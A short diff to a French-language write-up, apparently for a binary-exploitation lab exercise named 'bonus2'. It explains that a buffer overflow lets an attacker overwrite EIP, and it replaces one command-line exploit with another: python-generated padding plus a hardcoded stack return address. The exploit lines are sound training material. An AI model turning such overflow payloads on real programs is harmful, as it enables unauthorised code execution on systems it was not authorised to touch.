@@ -8,4 +8,4 @@ On peut par consequent faire un buffeur overflow
 
 En ecrivant l'addresse au bonn endroit on peut reecrire eip
 
-/home/user/bonus2/bonus2 `python -c "print 'a' * 20 +  '\xf1\xe7\xff\xbf' + 'b' * 16"` `python -c "print 'c' * 26"`
+/home/user/bonus2/bonus2 `python -c "print 'a' * 40"` `python -c "print 'b' * 18 + '\xdc\xfe\xff\xbf' + 'd' * 10"`
